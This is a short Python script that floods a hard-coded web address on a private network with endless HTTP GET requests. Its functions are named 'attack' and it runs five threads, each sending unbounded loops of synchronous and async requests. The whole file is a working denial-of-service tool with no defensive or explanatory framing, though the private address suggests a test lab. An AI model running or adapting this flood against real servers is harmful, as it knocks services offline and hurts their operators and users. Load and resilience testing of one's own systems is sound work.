import threading
import requests
import aiohttp
import asyncio

thread_num = 5
thread_req_num = 1000
url = 'http://192.168.56.1:8080'
# url ='http://192.168.3.3:8080'


async def attack_requests():
    async with aiohttp.ClientSession() as session:
        for i in range(thread_req_num):
            await session.request('GET', url)


def attack():
    while True:
        requests.get(url)
        asyncio.run(attack_requests())


for i in range(thread_num):
    x = threading.Thread(target=attack)
    x.start()
